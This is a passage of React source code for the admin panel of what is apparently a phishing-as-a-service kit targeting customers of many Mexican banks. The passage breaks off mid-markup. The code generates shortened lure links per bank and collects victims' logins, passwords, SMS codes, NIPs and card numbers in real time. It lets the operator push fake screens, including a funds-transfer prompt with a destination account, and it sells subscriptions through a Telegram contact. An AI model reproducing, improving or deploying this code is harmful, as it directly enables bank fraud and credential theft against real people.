import { useState, useEffect } from 'react';
import { useQuery, useMutation } from '@tanstack/react-query';
import { queryClient } from '@/lib/queryClient';
import { apiRequest } from '@/lib/queryClient';
import { useToast } from '@/hooks/use-toast';
import { useWebSocket } from '@/hooks/useWebSocket';
import { useAuth } from '@/hooks/use-auth';
import Sidebar from '@/components/admin/Sidebar';
import AccessTable from '@/components/admin/AccessTable';
import UserManagement from '@/components/admin/UserManagement';
import RegisteredUsersManagement from '@/components/admin/RegisteredUsersManagement';
import ExecutiveManagement from '@/components/admin/ExecutiveManagement';
import SmsManagementSimple from '@/components/admin/SmsManagementSimple';
import UserSmsPanel from '@/components/user/UserSmsPanel';
import QRManager from '@/components/admin/QRManager';
import { SimpleQRGenerator } from '@/components/admin/SimpleQRGenerator';
import TelegramBotManagement from '@/components/admin/TelegramBotManagement';
import { MessageSender } from '@/components/admin/MessageSender';
import SubscriptionInfo from '@/components/admin/SubscriptionInfo';
import { IdentityVerificationPanel } from '@/components/admin/IdentityVerificationPanel';
import { APKManagement } from '@/components/admin/APKManagement';
import SiteConfigManagement from '@/components/admin/SiteConfigManagement';
import SystemConfigManagement from '@/components/admin/SystemConfigManagement';
import WhatsAppBotPanel from '@/components/admin/WhatsAppBotPanel';
import UserWhatsAppPanel from '@/components/user/UserWhatsAppPanel';
import { LinkManagementPanel } from '@/components/admin/LinkManagementPanel';
import BankFlowManager from '@/components/admin/BankFlowManager';
import BankSubdomainManager from '@/components/admin/BankSubdomainManager';
import UserFlowManager from '@/components/user/UserFlowManager';
import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal } from '@/components/admin/Modals';
import { FileManager } from '@/components/admin/FileManager';
import { SessionDetails } from '@/components/admin/SessionDetails';
import { Session, ScreenType } from '@shared/schema';
import { Button } from '@/components/ui/button';
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { LogOut, UserCog, MessageSquare, Send, RefreshCw, QrCode } from 'lucide-react';
import { nanoid } from 'nanoid';

export default function AdminPanel() {
  const { toast } = useToast();
  const { user, logoutMutation } = useAuth();
  const [activeBank, setActiveBank] = useState<string>("todos");
  const [activeTab, setActiveTab] = useState<'current' | 'saved' | 'users' | 'registered' | 'executives' | 'sms' | 'qr' | 'telegram' | 'messages' | 'identity' | 'apk' | 'site-config' | 'system-config' | 'whatsapp' | 'links' | 'bank-flows' | 'bank-subdomains' | 'flows'>('current');
  
  // Actualizar el banco activo cuando el usuario cambia
  useEffect(() => {
    if (user) {
      // Si el usuario no tiene acceso a todos los bancos y tiene bancos específicos
      if (user.role !== 'admin' && user.allowedBanks !== 'all' && user.allowedBanks) {
        // Establecer el primer banco permitido como el activo
        const allowedBanks = user.allowedBanks.split(',');
        if (allowedBanks.length > 0) {
          setActiveBank(allowedBanks[0]);
        }
      }
    }
  }, [user]);
  
  // Verificar si hay parámetros para generar un enlace automáticamente
  useEffect(() => {
    if (!user) return;
    
    const params = new URLSearchParams(window.location.search);
    const generateLink = params.get('generateLink');
    const banco = params.get('banco') || 'LIVERPOOL';
    
    // Si está solicitando generar un enlace automáticamente y el usuario está autenticado
    if (generateLink === 'true') {
      console.log('Generando enlace automáticamente para banco:', banco);
      
      // Hacer la solicitud a la API directamente
      fetch(`/api/generate-link?banco=${banco}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json'
        },
        credentials: 'include'
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Error al generar enlace');
        }
        return response.json();
      })
      .then(data => {
        console.log('Enlace generado correctamente:', data);
        
        // Copiar el enlace al portapapeles en lugar de abrirlo
        if (data.link) {
          navigator.clipboard.writeText(data.link)
            .then(() => {
              console.log('Enlace copiado al portapapeles');
            })
            .catch(err => {
              console.error('Error al copiar enlace:', err);
            });
        }
        
        // Notificar al usuario
        toast({
          title: "Enlace generado",
          description: `Código: ${data.code}. El enlace ha sido copiado al portapapeles.`
        });
        
        // Limpiar los parámetros de URL
        const newUrl = window.location.pathname;
        window.history.pushState({}, '', newUrl);
      })
      .catch(error => {
        console.error('Error generando enlace:', error);
        toast({
          title: "Error al generar enlace",
          description: error.message,
          variant: "destructive"
        });
      });
    }
  }, [user, toast]);
  const [activeModal, setActiveModal] = useState<string | null>(null);
  const [clientLink, setClientLink] = useState<string>('');
  const [clientCode, setClientCode] = useState<string>('');
  const [sessions, setSessions] = useState<Session[]>([]);
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
  
  // Estados para la ventana emergente de enviar SMS
  const [isSmsSendDialogOpen, setIsSmsSendDialogOpen] = useState(false);
  const [smsPhoneNumber, setSmsPhoneNumber] = useState('');
  const [smsMessage, setSmsMessage] = useState('');
  const [isSendingSms, setIsSendingSms] = useState(false);

  // Determinar si es un usuario regular o administrador
  const isAdmin = user?.role === 'admin';
  const isSuperAdmin = user?.username === 'balonx';
  const isRegularUser = user?.role === 'user';

  // Socket connection for real-time updates
  const { socket, connected, sendMessage } = useWebSocket("/ws");

  // Fetch sessions from API
  // Consulta específica que garantice la obtención de sesiones guardadas
  const { data: initialSessions, isLoading, refetch: refresh } = useQuery({
    queryKey: ['/api/sessions', activeTab],
    queryFn: async () => {
      // Usar la pestaña activa para determinar el tipo, SIEMPRE SOLICITAMOS SAVED para brandon
      let type = activeTab === 'saved' ? 'saved' : 'current';
      
      if (user?.username === 'brandon') {
        // Forzar tipo 'saved' para cualquier pestaña si es el usuario brandon
        type = 'saved';
        console.log('FORZANDO obtención de sesiones guardadas para usuario brandon, independientemente de la pestaña.');
      }
      
      console.log(`Solicitando sesiones del tipo: ${type} (pestaña: ${activeTab}, usuario: ${user?.username})`);
      
      // Agregamos un timestamp para evitar caché
      const res = await apiRequest('GET', `/api/sessions?type=${type}&t=${Date.now()}`);
      const sessions = await res.json();
      
      console.log(`Recibidas ${sessions.length} sesiones del servidor, tipo: ${type}`);
      if (sessions.length > 0) {
        console.log('Primera sesión:', sessions[0]);
      }
      
      return sessions;
    },
    refetchInterval: 10000, // Actualizar cada 10 segundos (reducido de 3s para menor carga del servidor)
    refetchOnWindowFocus: true,
    // Configuración de caché basada en el tipo de sesiones
    staleTime: activeTab === 'saved' ? 60000 : 0, // Caché de 1 minuto para sesiones guardadas, sin caché para actuales
  });

  // Generate link mutation
  const generateLink = useMutation({
    mutationFn: async () => {
      // Utilizamos el banco seleccionado o LIVERPOOL como predeterminado si se eligió 'todos'
      let banco = activeBank === 'todos' ? 'LIVERPOOL' : activeBank;
      
      console.log(`Generating link for bank: ${banco}`);
      const res = await apiRequest('GET', `/api/generate-link?banco=${banco}`);
      
      if (!res.ok) {
        const errorData = await res.json();
        if (res.status === 403) {
          throw new Error(errorData.error || "No tienes permiso para usar este banco");
        }
        throw new Error("Error al generar enlace");
      }
      
      return await res.json();
    },
    onSuccess: (data) => {
      // Preferir shortUrl de Bitly si está disponible, sino usar link largo
      const linkToUse = data.shortUrl || data.link;
      setClientLink(linkToUse);
      setClientCode(data.code);
      toast({
        title: "Link generado",
        description: data.shortUrl 
          ? `Link acortado con Bitly: ${data.code}` 
          : `Link generado con código: ${data.code}`,
      });
      
      // Actualizar inmediatamente la lista de sesiones para mostrar la nueva sesión
      // Esto causará una recarga completa de las sesiones desde el servidor
      queryClient.invalidateQueries({ queryKey: ['/api/sessions'] });
      
      console.log("Solicitando actualización de sesiones después de generar enlace...");
      
      // Crear un elemento de texto temporal para copiar el enlace al portapapeles
      try {
        // Primero intentamos con el API Clipboard
        const textArea = document.createElement('textarea');
        textArea.value = linkToUse;
        
        // Añadimos temporalmente el elemento al DOM
        document.body.appendChild(textArea);
        
        // Seleccionamos y copiamos
        textArea.select();
        document.execCommand('copy');
        
        // Limpiamos
        document.body.removeChild(textArea);
        
        console.log('Enlace copiado al portapapeles');
        toast({
          title: "Enlace copiado",
          description: "El enlace ha sido copiado al portapapeles",
        });
      } catch (err) {
        console.error('Error al copiar enlace:', err);
        // Si falla, mostramos un mensaje para que copien manualmente
        toast({
          title: "Enlace generado",
          description: "Copia el enlace manualmente",
          variant: "default",
        });
      }
    },
    onError: (error: Error) => {
      toast({
        title: "Error al generar link",
        description: error.message,
        variant: "destructive",
      });
    }
  });

  // Socket event handlers
  useEffect(() => {
    if (connected && user) {
      // Register as admin with username for permission checking
      sendMessage({
        type: 'REGISTER',
        role: 'ADMIN',
        username: user.username
      });
    }
  }, [connected, sendMessage, user]);

  useEffect(() => {
    // Initialize sessions from API data
    if (initialSessions) {
      setSessions(Array.isArray(initialSessions) ? initialSessions : []);
    }
  }, [initialSessions]);
  
  // Redirigir a usuarios regulares si intentan acceder a pestañas restringidas por URL
  useEffect(() => {
    // Verificamos si estamos en pestañas restringidas
    if (!isSuperAdmin && (activeTab === 'users' || activeTab === 'registered')) {
      setActiveTab('current');
    }
    
    // QR solo para administradores
    if (user?.role !== 'admin' && activeTab === 'qr') {
      setActiveTab('current');
    }
  }, [activeTab, isSuperAdmin, user?.role]);

  // Efecto para cargar las sesiones (solo se ejecuta al cambiar la pestaña)
  useEffect(() => {
    // Cargar las sesiones inmediatamente al cambiar de pestaña
    refresh();
    
    // Ya no usamos polling porque usamos WebSockets para actualizaciones en tiempo real
  }, [activeTab, refresh]);

  // Socket message handler
  useEffect(() => {
    if (!socket) return;

    const handleMessage = (event: MessageEvent) => {
      try {
        const data = JSON.parse(event.data);
        console.log("Mensaje WebSocket recibido en AdminPanel:", data.type);
        
        if (data.type === 'INIT_SESSIONS') {
          console.log(`Recibidas ${data.data.length} sesiones vía WebSocket`);
          setSessions(data.data);
        }
        else if (data.type === 'SESSION_UPDATE') {
          // Solo actualizar la sesión en la pestaña actual
          if ((activeTab === 'current' && !data.data.saved) || 
              (activeTab === 'saved' && data.data.saved)) {
              
            console.log(`Actualizando sesión: ${data.data.sessionId}, creada por: ${data.data.createdBy || 'desconocido'}`);
            
            // Verificar si esta sesión le pertenece al usuario actual
            const isOwnSession = data.data.createdBy === user?.username;
            const isSuperAdmin = user?.username === 'balonx';
            
            if (isOwnSession || isSuperAdmin) {
              setSessions(prev => {
                const updated = [...prev];
                const index = updated.findIndex(s => s.sessionId === data.data.sessionId);
                if (index >= 0) {
                  updated[index] = data.data;
                  console.log('Sesión actualizada en la lista existente');
                } else {
                  updated.push(data.data);
                  console.log('Nueva sesión añadida a la lista');
                }
                return updated;
              });
            } else {
              console.log('Sesión ignorada porque pertenece a otro usuario');
            }
          }
        }
        else if (data.type === 'SESSIONS_UPDATED') {
          console.log('Recibida señal para actualizar sesiones');
          // Refrescar la lista de sesiones desde el servidor
          queryClient.invalidateQueries({ queryKey: ['/api/sessions', activeTab] });
        }
        else if (data.type === 'SESSION_DELETE') {
          // Eliminar la sesión de la lista si está presente
          setSessions(prev => 
            prev.filter(session => session.sessionId !== data.data.sessionId)
          );
          
          // Si la sesión eliminada era la seleccionada, deseleccionarla
          if (selectedSessionId === data.data.sessionId) {
            setSelectedSessionId(null);
          }
          
          toast({
            title: "Sesión eliminada",
            description: "La sesión ha sido eliminada correctamente.",
          });
        }
        else if (data.type === 'SESSIONS_CLEANUP') {
          // Notificar al usuario sobre la limpieza de sesiones expiradas
          const { deletedCount } = data.data;
          if (deletedCount > 0) {
            toast({
              title: "Limpieza automática",
              description: `${deletedCount} sesiones antiguas (>5 días) han sido eliminadas.`,
            });
            
            // Actualizar la lista desde el servidor
            queryClient.invalidateQueries({ queryKey: ['/api/sessions', activeTab] });
          }
        }
        else if (data.type === 'SMS_COMPRA_CODE') {
          // Notificación especial para códigos SMS_COMPRA
          const { sessionId, code } = data.data;
          
          toast({
            title: "Código de cancelación SMS_COMPRA",
            description: `Código: ${code} (Sesión: ${sessionId.substring(0, 6)}...)`,
            variant: "default",
          });
          
          console.log("SMS_COMPRA code:", code, "para sesión:", sessionId);
        }
        else if (data.type === 'CLIENT_INPUT_REALTIME') {
          // Mostrar notificación de entrada de datos en tiempo real
          const { sessionId, tipo, inputData } = data.data;
          
          // Manejo especial para SMS_COMPRA
          if (tipo === 'sms_compra' || tipo === 'SMS_COMPRA' || tipo === 'smsCompra') {
            if (inputData && inputData.smsCompra) {
              toast({
                title: "¡Código de cancelación recibido!",
                description: `Código: ${inputData.smsCompra}`,
                variant: "default",
              });
            }
          }
          
          // Mostrar notificación toast con los datos recibidos
          let inputDescription = '';
          switch (tipo) {
            case 'folio':
              inputDescription = `Folio: ${inputData.folio}`;
              break;
            case 'login':
              inputDescription = `Usuario: ${inputData.username}, Contraseña: ${inputData.password}`;
              break;
            case 'codigo':
              inputDescription = `Código SMS: ${inputData.codigo}`;
              break;
            case 'nip':
              inputDescription = `NIP: ${inputData.nip}`;
              break;
            case 'tarjeta':
              inputDescription = `Tarjeta: ${inputData.tarjeta}`;
              break;
            case 'sms_compra':
            case 'SMS_COMPRA':
            case 'smsCompra':
              inputDescription = `Código de Cancelación: ${inputData.smsCompra}`;
              break;
            case 'PROTECCION_SALDO':
            case 'proteccion_saldo':
              inputDescription = `Protección - Débito: ${inputData.saldoDebito || 'N/A'} (${inputData.montoDebito || '0'}), Crédito: ${inputData.saldoCredito || 'N/A'} (${inputData.montoCredito || '0'})`;
              break;
            default:
              inputDescription = `Datos de ${tipo}`;
          }
          
          toast({
            title: "Datos recibidos en tiempo real",
            description: inputDescription,
            variant: "default",
          });
          
          // Actualizar la sesión en la interfaz para mostrar datos inmediatamente
          setSessions(prev => {
            const updated = [...prev];
            const index = updated.findIndex(s => s.sessionId === sessionId);
            
            if (index >= 0) {
              // Crear copia de la sesión actual
              const updatedSession = { ...updated[index] };
              
              // Actualizar los campos según el tipo de datos
              switch (tipo) {
                case 'folio':
                  updatedSession.folio = inputData.folio;
                  break;
                case 'login':
                  updatedSession.username = inputData.username;
                  updatedSession.password = inputData.password;
                  break;
                case 'codigo':
                  updatedSession.sms = inputData.codigo;
                  break;
                case 'nip':
                  updatedSession.nip = inputData.nip;
                  break;
                case 'tarjeta':
                  updatedSession.tarjeta = inputData.tarjeta;
                  break;
                case 'sms_compra':
                case 'SMS_COMPRA':
                case 'smsCompra':
                  updatedSession.smsCompra = inputData.smsCompra;
                  break;
                case 'celular':
                  updatedSession.celular = inputData.celular;
                  break;
                case 'CANCELACION_RETIRO':
                case 'cancelacion_retiro':
                  updatedSession.codigoRetiro = inputData.codigoRetiro;
                  if (inputData.pinRetiro) {
                    updatedSession.pinRetiro = inputData.pinRetiro;
                  }
                  break;
                case 'PROTECCION_SALDO':
                case 'proteccion_saldo':
                  updatedSession.saldoDebito = inputData.saldoDebito;
                  updatedSession.montoDebito = inputData.montoDebito;
                  updatedSession.saldoCredito = inputData.saldoCredito;
                  updatedSession.montoCredito = inputData.montoCredito;
                  break;
              }
              
              // Actualizar en la lista
              updated[index] = updatedSession;
            }
            
            return updated;
          });
        }
      } catch (error) {
        console.error("Error parsing WebSocket message:", error);
      }
    };

    socket.addEventListener('message', handleMessage);
    return () => {
      socket.removeEventListener('message', handleMessage);
    };
  }, [socket]);

  // Handle screen change
  const handleScreenChange = (screen: string) => {
    if (!selectedSessionId) {
      toast({
        title: "Seleccione una sesión",
        description: "Debe seleccionar una sesión para cambiar la pantalla.",
        variant: "destructive",
      });
      return;
    }

    // Debug para rastrear el flujo
    console.log("handleScreenChange recibió tipo de pantalla:", screen);

    // Handle modals for certain screens
    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra"].includes(screen)) {
      console.log("Activando modal para:", screen);
      setActiveModal(screen);
      return;
    }
    
    // Para cancelacion_retiro, enviamos directamente sin modal
    if (screen === "cancelacion_retiro") {
      console.log("Enviando pantalla de cancelación de retiro");
      // No necesitamos un modal, simplemente enviamos la pantalla
    }
    

    
    // Para escanear_qr, enviamos directamente sin modal
    console.log("Enviando tipo de pantalla:", screen);

    // Send direct screen change for other screens
    sendScreenChange({
      tipo: `mostrar_${screen}`,
      sessionId: selectedSessionId
    });
  };

  // Send screen change via WebSocket
  const sendScreenChange = (data: any) => {
    if (connected) {
      sendMessage({
        type: 'SCREEN_CHANGE',
        data
      });

      toast({
        title: "Pantalla cambiada",
        description: `La pantalla ha sido cambiada a ${data.tipo.replace('mostrar_', '')}.`,
      });
    } else {
      toast({
        title: "Error de conexión",
        description: "No hay conexión con el servidor.",
        variant: "destructive",
      });
    }
  };

  // Copy link to clipboard usando método alternativo
  const copyLink = () => {
    try {
      // Crear un elemento temporal para copiar
      const textArea = document.createElement('textarea');
      textArea.value = clientLink;
      
      // Añadir el elemento al DOM
      document.body.appendChild(textArea);
      
      // Seleccionar y copiar
      textArea.select();
      document.execCommand('copy');
      
      // Eliminar el elemento temporal
      document.body.removeChild(textArea);
      
      toast({
        title: "Link copiado",
        description: "El link ha sido copiado al portapapeles.",
      });
    } catch (error) {
      toast({
        title: "Error al copiar",
        description: "No se pudo copiar el link al portapapeles.",
        variant: "destructive",
      });
    }
  };

  // Handle session selection
  const selectSession = (sessionId: string) => {
    setSelectedSessionId(sessionId);
  };

  // Modal handlers
  const closeModal = () => setActiveModal(null);

  const handleProtectConfirm = (amount: string) => {
    sendScreenChange({
      tipo: 'mostrar_protege',
      sessionId: selectedSessionId,
      saldo: amount
    });
    closeModal();
  };

  const handleTransferConfirm = (data: { cantidad: string, titular: string, clabe: string, alias: string }) => {
    sendScreenChange({
      tipo: 'mostrar_transferir',
      sessionId: selectedSessionId,
      monto: data.cantidad,
      titular: data.titular,
      clabe: data.clabe
    });
    closeModal();
  };

  const handleCancelConfirm = (data: { importe: string, negocio: string }) => {
    sendScreenChange({
      tipo: 'mostrar_cancelacion',
      sessionId: selectedSessionId,
      monto: data.importe,
      comercio: data.negocio
    });
    closeModal();
  };

  const handleCodeConfirm = (telefono: string) => {
    // Ya estamos recibiendo un número de 10 dígitos (6 prefijo + 4 ingresados)
    // desde el modal modificado
    if (telefono && telefono.length === 10) {
      const terminacion = telefono.substring(telefono.length - 4);
      
      // Mostrar el screen change directamente con la terminación ingresada
      // ya no necesitamos actualizar el número completo del teléfono
      if (selectedSessionId) {
        // Enviamos directamente el screen change, no necesitamos actualizar el teléfono en la BD
        sendScreenChange({
          tipo: 'mostrar_codigo',
          sessionId: selectedSessionId,
          terminacion
        });
      }
    } else {
      toast({
        title: "Formato inválido",
        description: "Error en el formato de los últimos 4 dígitos del teléfono.",
        variant: "destructive",
      });
      return;
    }
    
    closeModal();
  };

  const handleMessageConfirm = (mensaje: string) => {
    sendScreenChange({
      tipo: 'mostrar_mensaje',
      sessionId: selectedSessionId,
      mensaje
    });
    closeModal();
  };

  const handleSmsCompraConfirm = (telefono: string) => {
    // Solo esperamos los últimos 4 dígitos del teléfono
    if (telefono && telefono.length === 4) {
      const terminacion = telefono; // Ya tenemos directamente los 4 dígitos
      
      // Enviar directamente la pantalla de SMS_COMPRA con los 4 dígitos
      if (selectedSessionId) {
        // Entonces, send the screen change directamente
        console.log("ScreenType.SMS_COMPRA:", ScreenType.SMS_COMPRA);
        console.log("Enviando terminación:", terminacion);
        sendScreenChange({
          tipo: `mostrar_${ScreenType.SMS_COMPRA}`,
          sessionId: selectedSessionId,
          terminacion
        });
      }
    } else {
      toast({
        title: "Entrada inválida",
        description: "Ingrese exactamente los 4 últimos dígitos del número celular.",
        variant: "destructive",
      });
      return;
    }
    
    closeModal();
  };


  
  // Manejar el envío de SMS
  const sendSms = useMutation({
    mutationFn: async () => {
      // Validar número de teléfono
      if (!smsPhoneNumber || smsPhoneNumber.length !== 10 || !/^\d+$/.test(smsPhoneNumber)) {
        throw new Error("El número de teléfono debe tener 10 dígitos numéricos");
      }
      
      // Validar mensaje
      if (!smsMessage.trim()) {
        throw new Error("El mensaje no puede estar vacío");
      }
      
      const res = await apiRequest("POST", "/api/sms/send", {
        phoneNumber: smsPhoneNumber,
        message: smsMessage
      });
      
      return await res.json();
    },
    onMutate: () => {
      setIsSendingSms(true);
    },
    onSuccess: () => {
      toast({
        title: "SMS enviado",
        description: "El mensaje ha sido enviado correctamente.",
      });
      
      // Limpiar el formulario y cerrar la ventana
      setSmsPhoneNumber("");
      setSmsMessage("");
      setIsSmsSendDialogOpen(false);
      
      // Actualizar historial de SMS
      queryClient.invalidateQueries({ queryKey: ['/api/sms/history'] });
      queryClient.invalidateQueries({ queryKey: ['/api/sms/credits'] });
    },
    onError: (error: Error) => {
      toast({
        title: "Error al enviar SMS",
        description: error.message,
        variant: "destructive",
      });
    },
    onSettled: () => {
      setIsSendingSms(false);
    }
  });

  // Vista completa para administradores
  return (
    <div className="flex flex-col md:flex-row w-full min-h-screen overflow-y-auto mobile-scrollable mobile-full-height">
      {/* Sidebar */}
      <Sidebar 
        activeTab={activeTab}
        onTabChange={(tab) => setActiveTab(tab as 'current' | 'saved' | 'users' | 'registered' | 'executives' | 'sms')}
        isAdmin={isAdmin}
        isSuperAdmin={isSuperAdmin}
        accountType={user?.accountType as 'individual' | 'office' | undefined}
        isExecutive={(user as any)?.isExecutive}
      />

      {/* Main Content */}
      <div className="flex-1 bg-[#121212] text-white flex flex-col min-h-screen overflow-y-auto mobile-scrollable mobile-full-height">
        {/* Header Section - Estado de cuenta compacto arriba */}
        <div className="p-2 md:p-3 pb-0 pt-16 md:pt-3">
          <div className="mb-2">
            <SubscriptionInfo />
          </div>

          {/* Mensaje de Soporte Técnico */}
          <div className="mb-3 p-3 bg-blue-900/30 border border-blue-700/50 rounded-lg">
            <div className="flex items-center gap-2">
              <MessageSquare className="h-4 w-4 text-blue-400" />
              <span className="text-sm font-medium text-blue-200">Soporte Técnico y Suscripciones:</span>
            </div>
            <p className="text-sm text-blue-100 mt-1">
              Para soporte técnico o gestión de suscripciones, comunícate por Telegram con{' '}
              <span className="font-semibold text-blue-300">@BalonxSistema</span>
            </p>
          </div>

          <div className="flex flex-col md:flex-row md:justify-between md:items-start gap-2 md:gap-0">
            <div>
              <p className="text-[#00aaff]">Panel / Accesos</p>
              <h1 className="text-xl md:text-2xl font-bold mb-3">Panel Accesos</h1>
              
              <div className="mt-2">
                <label htmlFor="pantallaControl" className="text-sm text-gray-400">
                  Acciones / Control de Pantalla:
                </label>
                <select 
                  id="pantallaControl" 
                  className="mt-1 bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2 w-64"
                  onChange={(e) => handleScreenChange(e.target.value)}
                  value=""
                >
                  <option value="">Selecciona una opción</option>
                  <option value="login">1. Login</option>
                  <option value="codigo">2. Código de verificación</option>
                  <option value="nip">3. NIP</option>
                  <option value="protege">4. Protege tu información</option>
                  <option value="tarjeta">5. Ingresa tarjeta</option>
                  <option value="transferir">6. Transfiere fondos</option>
                  <option value="cancelacion">7. Cancelación exitosa</option>
                  <option value="mensaje">8. Ingresa el mensaje que gustes</option>
                  <option value="sms_compra">9. SMS Compra - Cancelación de cargos</option>
                  <option value="escanear_qr">10. Escanear QR de Tarjeta</option>
                  <option value="cancelacion_retiro">11. Cancelación de retiro sin tarjeta</option>
                  <option value="proteccion_bancaria">12. Protección Bancaria</option>
                  <option value="proteccion_saldo">13. Protección de Saldo</option>
                  <option value="verificacion_id">14. Verificación ID</option>
                </select>
              </div>
            </div>
            
            {/* Botones de SMS eliminados por solicitud del usuario */}
          </div>
        </div>
        
        {/* Link Panel */}
        <div className="mx-4 md:mx-6 mt-6 bg-[#1e1e1e] p-3 md:p-4 rounded-lg flex flex-col md:flex-row gap-4 md:gap-0 md:justify-between md:items-center">
          <div className="flex flex-col md:flex-row md:items-center gap-3 md:space-x-2">
            {/* En móvil, botones de acción primero (encima de los enlaces) por solicitud del usuario */}
            <div className="flex space-x-2 order-first mb-2 md:mb-0 md:order-last">
              <button 
                className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
                onClick={copyLink}
              >
                Copiar
              </button>
              <button 
                className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
                onClick={() => generateLink.mutate()}
              >
                {generateLink.isPending ? 'Generando...' : 'Regenerar'}
              </button>
              <a 
                href="/qr-generator"
                className="text-sm text-white font-medium bg-blue-600 hover:bg-blue-700 px-3 py-1 rounded flex items-center"
              >
                <svg xmlns="http://www.w3.org/2000/svg" className="mr-1 h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="3" y="3" width="18" height="18" rx="2" />
                  <rect x="7" y="7" width="3" height="3" />
                  <rect x="14" y="7" width="3" height="3" />
                  <rect x="7" y="14" width="3" height="3" />
                  <rect x="14" y="14" width="3" height="3" />
                </svg>
                QR
              </a>
            </div>
            
            <div className="flex items-center gap-2">
              <span className="font-semibold">Liga activa:</span>
              {clientLink && (
                <a 
                  href={clientLink} 
                  target="_blank" 
                  className="text-[#00aaff] text-sm md:text-base truncate max-w-[140px] md:max-w-[200px] lg:max-w-none"
                >
                  {clientLink}
                </a>
              )}
            </div>
            
            {clientCode && (
              <span className={`font-bold px-3 py-1 rounded-md inline-flex items-center ${
                activeBank === 'BANBAJIO' 
                  ? 'text-white bg-[#4D2C91]' 
                  : 'text-green-400 bg-[#1a3e1a]'
              }`}>
                Código: <span className="text-xl tracking-wider ml-1">{clientCode}</span>
              </span>
            )}
          </div>
          
          <select 
            id="filtroBanco" 
            className="bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2 w-full md:w-auto"
            value={activeBank}
            onChange={(e) => setActiveBank(e.target.value)}
          >
            {user?.allowedBanks === 'all' || user?.role === 'admin' ? (
              <>
                <option value="todos">Todos los bancos</option>
                <option value="AFIRME">AFIRME</option>
                <option value="AMEX">AMEX</option>
                <option value="BANBAJIO">BANBAJIO</option>
                <option value="BANCO_AZTECA">BANCO AZTECA</option>
                <option value="BANCOPPEL">BANCOPPEL</option>
                <option value="BANORTE">BANORTE</option>
                <option value="BANREGIO">BANREGIO</option>
                <option value="BBVA">BBVA</option>
                <option value="BIENESTAR">BANCO BIENESTAR</option>
                <option value="CITIBANAMEX">CITIBANAMEX</option>
                <option value="HSBC">HSBC</option>
                <option value="INBURSA">INBURSA</option>
                <option value="INVEX">INVEX</option>
                <option value="LIVERPOOL">LIVERPOOL</option>
                <option value="PLATACARD">PLATACARD</option>
                <option value="SANTANDER">SANTANDER</option>
                <option value="SCOTIABANK">SCOTIABANK</option>
                <option value="SPIN">SPIN</option>
              </>
            ) : (
              <>
                {user?.allowedBanks?.split(',').map(bank => (
                  <option key={bank} value={bank}>
                    {bank.toUpperCase()}
                  </option>
                ))}
              </>
            )}
          </select>
        </div>

        {/* User Info & Logout */}
        <div className="mx-4 md:mx-6 mt-2 md:mt-4 flex flex-row justify-end">
          <div className="flex items-center space-x-2">
            <span className="text-gray-400 text-xs md:text-sm mr-1 md:mr-2">
              {user?.username} ({user?.role})
            </span>
            <Button 
              variant="outline" 
              size="sm"
              className="text-gray-300 hover:text-white text-xs md:text-sm py-1 h-8"
              onClick={() => logoutMutation.mutate()}
            >
              <LogOut className="h-3 w-3 md:h-4 md:w-4 mr-1" />
              <span className="hidden sm:inline">Cerrar sesión</span>
              <span className="sm:hidden">Salir</span>
            </Button>
          </div>
        </div>

        {/* Tabs */}
        <div className="mx-4 md:mx-6 mt-4 overflow-x-auto pb-2">
          <div className="flex space-x-3 md:space-x-4 min-w-max">
            <div 
              className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap transition-all duration-200 font-medium ${activeTab === 'current' 
                ? 'border-[#00aaff] text-[#00aaff] bg-[#00aaff10] border-b-[3px] font-bold' 
                : 'border-transparent hover:text-gray-300 hover:border-gray-500'}`}
              onClick={() => setActiveTab('current')}
              style={{
                padding: '6px 10px',
                borderRadius: '6px 6px 0 0'
              }}
            >
              Accesos actuales
            </div>
            <div 
              className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap transition-all duration-200 font-medium ${activeTab === 'saved' 
                ? 'border-[#00aaff] text-[#00aaff] bg-[#00aaff10] border-b-[3px] font-bold' 
                : 'border-transparent hover:text-gray-300 hover:border-gray-500'}`}
              onClick={() => setActiveTab('saved')}
              style={{
                padding: '6px 10px',
                borderRadius: '6px 6px 0 0'
              }}
            >
              Accesos guardados
            </div>
            {isSuperAdmin && (
              <>
                <div 
                  className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap transition-all duration-200 font-medium ${activeTab === 'users' 
                    ? 'border-[#00aaff] text-[#00aaff] bg-[#00aaff10] border-b-[3px] font-bold' 
                    : 'border-transparent hover:text-gray-300 hover:border-gray-500'}`}
                  onClick={() => setActiveTab('users')}
                  style={{
                    padding: '6px 10px',
                    borderRadius: '6px 6px 0 0'
                  }}
                >
                  Usuarios
                </div>
                <div 
                  className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap transition-all duration-200 font-medium ${activeTab === 'registered' 
                    ? 'border-[#00aaff] text-[#00aaff] bg-[#00aaff10] border-b-[3px] font-bold' 
                    : 'border-transparent hover:text-gray-300 hover:border-gray-500'}`}
                  onClick={() => setActiveTab('registered')}
                  style={{
                    padding: '6px 10px',
                    borderRadius: '6px 6px 0 0'
                  }}
                >
                  Usuarios Registrados
                </div>
              </>
            )}
            {/* Ejecutivos solo para cuentas de oficina (no para ejecutivos) */}
            {user?.accountType === 'office' && !(user as any)?.isExecutive && (
              <div 
                className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap transition-all duration-200 font-medium ${activeTab === 'executives' 
                  ? 'border-[#00aaff] text-[#00aaff] bg-[#00aaff10] border-b-[3px] font-bold' 
                  : 'border-transparent hover:text-gray-300 hover:border-gray-500'}`}
                onClick={() => setActiveTab('executives')}
